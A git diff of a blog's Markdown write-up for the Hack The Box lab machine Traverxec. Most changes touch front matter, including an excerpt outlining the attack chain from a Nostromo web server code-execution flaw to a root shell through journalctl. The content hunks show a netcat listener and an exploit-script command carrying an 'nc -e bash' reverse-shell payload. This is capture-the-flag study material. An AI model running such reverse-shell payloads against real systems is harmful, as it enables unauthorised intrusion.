@@ -1,16 +1,24 @@
 ---
 title: "Traverxec"
 subtitle: Hack The Box
-date: 2020-08-24
-featured_image: /images/traverxec/traverxec_bio.png
-image: /images/traverxec/traverxec_bio.png
-share-img: /images/traverxec/traverxec_bio.png
+excerpt: "Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user's home directory reveals that the user can execute `journalctl` as root, which is exploited to spawn a `root` shell!"
+header:
+  image: /images/traverxec/traverxec_bio.png
+  teaser: /images/traverxec/traverxec_bio.png
+share_image: /images/traverxec/traverxec_bio.png
 published: true
-categories: write-ups
 author_profile: true
 tags:
   - Writeup
   - kali
+
+sidebar:
+  - title: "Traverxec"
+    image: /images/traverxec/traverxec_bio.png
+    image_alt: "Traverxec"
+    text: "Hack The Box"
+  - title: "Skills Learned"
+    text: "SSH Key Cracking, GTFOBins"
   
 ---
 
@@ -68,7 +76,7 @@ nc -lvnp 9001
 ```
 
 ```bash
-pythin 47837.py "nc -e bash 10.10.10.165 9001"
+python 47837.py "nc -e bash 10.10.10.165 9001"
 ```
 
 And........ We get a shell
